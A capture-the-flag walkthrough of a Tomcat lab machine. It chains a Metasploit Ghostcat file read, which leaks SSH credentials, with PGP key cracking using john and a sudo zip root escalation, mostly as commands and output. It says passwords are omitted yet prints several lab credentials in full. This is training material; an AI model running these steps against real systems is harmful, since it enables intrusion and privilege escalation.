## Descripion
```Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

**Are you able to complete the challenge?  
**The machine may take up to 5 minutes to boot and configure.

_Admins Note: This room contains inappropriate content in the form of a username that contains a swear word and should be noted for an educational setting. - Dark_
```
## IP-Address
```Ip 
10.48.176.143
```
## Scan 
```bash
$ rustscan -a $TARGET -b 450 -t 2000 --ulimit 5000 -- -e tun0 -Pn -A
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQvC8xe2qKLoPG3vaJagEW2eW4juBu9nJvn53nRjyw7y/0GEWIxE1KqcPXZiL+RKfkKA7RJNTXN2W9kCG8i6JdVWs2x9wD28UtwYxcyo6M9dQ7i2mXlJpTHtSncOoufSA45eqWT4GY+iEaBekWhnxWM+TrFOMNS5bpmUXrjuBR2JtN9a9cqHQ2zGdSlN+jLYi2Z5C7IVqxYb9yw5RBV5+bX7J4dvHNIs3otGDeGJ8oXVhd+aELUN8/C2p5bVqpGk04KI2gGEyU611v3eOzoP6obem9vsk7Kkgsw7eRNt1+CBrwWldPr8hy6nhA6Oi5qmJgK1x+fCmsfLSH3sz1z4Ln
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOscw5angd6i9vsr7MfCAugRPvtx/aLjNzjAvoFEkwKeO53N01Dn17eJxrbIWEj33sp8nzx1Lillg/XM+Lk69CQ=
|   256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqgzoXzgz5QIhEWm3+Mysrwk89YW2cd2Nmad+PrE4jw
53/tcp   open  tcpwrapped syn-ack ttl 62
8009/tcp open  ajp13      syn-ack ttl 62 Apache Jserv (Protocol v1.3)
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       syn-ack ttl 62 Apache Tomcat 9.0.30
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
```
## Enumeration
- `Feroxbuster` - Directory and Files discovery 
```bash
$ feroxbuster -u http://10.48.176.143:8080/ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-t 100 -x php,txt,html,jsp -k -n
### Accessible Resources (HTTP 200)
- `/`
- `/index.jsp`
- `/docs/`
- `/docs/RELEASE-NOTES.txt`
- `/docs/setup.html`
- `/docs/security-howto.html`
- `/docs/manager-howto.html`
- `/examples/`

  ### Restricted Resources (HTTP 403)
- `/manager/html`
- `/manager/status`
- `/host-manager/html`
```
- Restricted Resources Content 
- Implement for All Files
```/host-manager/html
403 Access Denied
You are not authorized to view this page.

By default the Host Manager is only accessible from a browser running on the same machine as Tomcat. If you wish to modify this restriction, you'll need to edit the Host Manager's context.xml file.

If you have already configured the Host Manager application to allow access and you have used your browsers back button, used a saved book-mark or similar then you may have triggered the cross-site request forgery (CSRF) protection that has been enabled for the HTML interface of the Host Manager application. You will need to reset this protection by returning to the main Host Manager page. Once you return to this page, you will be able to continue using the Host Manager application's HTML interface normally. If you continue to see this access denied message, check that you have the necessary permissions to access this application.

If you have not changed any configuration files, please examine the file conf/tomcat-users.xml in your installation. That file must contain the credentials to let you use this webapp.

For example, to add the admin-gui role to a user named tomcat with a password of s3cret, add the following to the config file listed above.

<role rolename="admin-gui"/>
<user username="tomcat" password="[password omitted]" roles="admin-gui"/>
Note that for Tomcat 7 onwards, the roles required to use the host manager application were changed from the single admin role to the following two roles. You will need to assign the role(s) required for the functionality you wish to access.

admin-gui - allows access to the HTML GUI
admin-script - allows access to the text interface
The HTML interface is protected against CSRF but the text interface is not. To maintain the CSRF protection:

Users with the admin-gui role should not be granted the admin-script role.
If the text interface is accessed through a browser (e.g. for testing since this interface is intended for tools not humans) then the browser must be closed afterwards to terminate the session.
```
## MSFConsole
```bash
msf > use auxiliary/admin/http/tomcat_ghostcat
msf auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS 10.48.176.143
RHOSTS => 10.48.176.143
msf auxiliary(admin/http/tomcat_ghostcat) > set RPORT 8009
RPORT => 8009
msf auxiliary(admin/http/tomcat_ghostcat) > run
[*] Running module against 10.48.176.143
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
[+] 10.48.176.143:8009 - File contents save to: /home/kali/.msf4/loot/20260409075924_default_10.48.176.143_WEBINFweb.xml_532117.txt
[*] Auxiliary module execution completed

```
- Got the Credentials for `SSH`
```Credentials
Username - skyfuck
Password - [password omitted]
```
## SSH 
```bash
$ ssh skyfuck@10.48.176.143
Password - [password omitted]
```
- Found 2 Files name - 
```bash
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
skyfuck@ubuntu:~$ strings credential.pgp
The program 'strings' can be found in the following packages:
 * binutils
 * binutils-multiarch
Ask your administrator to install one of them
```
- Looking for python 
```bash
skyfuck@ubuntu:~$ python3 --version
Python 3.5.2
skyfuck@ubuntu:~$ python3 -m http.server
```
- Import into own Atrtack Machine
```bash
$ wget http://10.48.176.143:8000/tryhackme.asc

--2026-04-09 08:05:55--  http://10.48.176.143:8000/tryhackme.asc
Connecting to 10.48.176.143:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5144 (5.0K) [text/plain]
Saving to: ‘tryhackme.asc’

tryhackme.asc        100%[=====================>]   5.02K  --.-KB/s    in 0s

2026-04-09 08:05:55 (93.7 MB/s) - ‘tryhackme.asc’ saved [5144/5144]
$ wget http://10.48.176.143:8000/credential.pgp

--2026-04-09 08:06:05--  http://10.48.176.143:8000/credential.pgp
Connecting to 10.48.176.143:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 394 [application/pgp-encrypted]
Saving to: ‘credential.pgp’

credential.pgp       100%[=====================>]     394  --.-KB/s    in 0s

2026-04-09 08:06:06 (71.6 MB/s) - ‘credential.pgp’ saved [394/394]
```
- Files Content
```bash
$ strings credential.pgp
0H:,
FP:0a
5J:EM,

 strings tryhackme.asc
-----BEGIN PGP PRIVATE KEY BLOCK-----
[private key omitted]
-----END PGP PRIVATE KEY BLOCK-----
```
- Got a Encrypted Key need to Decrypt 
```bash
$ gpg2john tryhackme.asc > hash.txt
File tryhackme.asc

$ cat hash.txt
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc

$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)
1g 0:00:00:00 DONE (2026-04-09 08:13) 25.00g/s 26800p/s 26800c/s 26800C/s theresa..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
- Got the Password of the key - `alexandru`
- Use this Password for both command 
```bash
─$ gpg --import tryhackme.asc
Password: [password omitted]
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:              unchanged: 2
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

$ gpg --decrypt credential.pgp
Password: [password omitted]
gpg: encrypted with elg1024 key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```
- Got Another Credentials
```creds
Username - merlin
Password - asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```
- SSH
```bash
skyfuck@ubuntu:~$ su merlin
Password:
merlin@ubuntu:/home/skyfuck$ cd
merlin@ubuntu:~$ ls
user.txt
merlin@ubuntu:~$ cat user.txt
[flag omitted]
```
## User Flag
```Flag
[flag omitted]
```
## Privilege Escalation
```bash
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```
- Moving Forward 
```bash
merlin@ubuntu:~$ sudo zip exploit.zip /etc/hosts -T --unzip-command="sh -c /bin/bash"
  adding: etc/hosts (deflated 31%)
  root@ubuntu:~# 
```
- We don't need any exploit.zip File for `sudo` escalation
```bash
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# cd
root@ubuntu:~# ls
user.txt  zi3hkMrc
root@ubuntu:~# cat /root/root.txt
[flag omitted]
```
- Got the root Flag
```Flag
[flag omitted]
```
## Flags
```Flags
User - merlin - [flag omitted]
Root - [flag omitted]
```
# END